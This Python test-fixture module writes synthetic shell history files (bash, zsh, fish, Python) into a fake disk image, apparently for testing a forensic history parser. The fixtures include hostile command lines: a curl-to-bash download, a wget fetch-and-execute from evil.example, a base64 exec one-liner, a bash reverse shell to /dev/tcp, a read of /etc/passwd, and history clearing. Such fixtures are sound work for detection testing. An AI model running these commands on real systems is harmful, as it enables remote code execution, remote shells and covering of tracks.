"""Synthetic history-file fixtures."""

from __future__ import annotations

from pathlib import Path

# bash with HISTTIMEFORMAT timestamps (epoch comment lines)
BASH_TS = """\
#1707552000
ls -la
#1707552060
sudo systemctl restart nginx
#1707552120
curl -s http://198.51.100.7/a.sh | bash
#1707552180
history -c
#1707552090
echo 'out of order line'
"""

# bash without timestamps, one command per line, incl. a multi-word attack
BASH_PLAIN = """\
whoami
cat /etc/passwd
wget http://evil.example/x -O /tmp/x && chmod +x /tmp/x && /tmp/x
nano notes.txt
"""

ZSH_EXT = """\
: 1707600000:0;cd /var/www
: 1707600030:5;git pull
: 1707600060:0;python3 -c "import base64;exec(base64.b64decode('cHJpbnQoMSk='))"
: 1707600090:0;for i in 1 2 3; do \\
echo $i; \\
done
"""

FISH_HIST = """\
- cmd: echo hello
  when: 1707610000
- cmd: bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
  when: 1707610060
  paths:
    - /tmp
"""

PY_HIST = """\
import os
os.system('id')
print('done')
"""


def build_root(base: Path) -> Path:
    root = base / "img"

    def w(rel, text):
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)

    w("root/.bash_history", BASH_TS)
    w("home/alice/.bash_history", BASH_PLAIN)
    w("home/alice/.zsh_history", ZSH_EXT)
    w("home/bob/.local/share/fish/fish_history", FISH_HIST)
    w("home/bob/.python_history", PY_HIST)
    w("home/carol/.bash_history", "")          # empty -> wipe marker
    return root
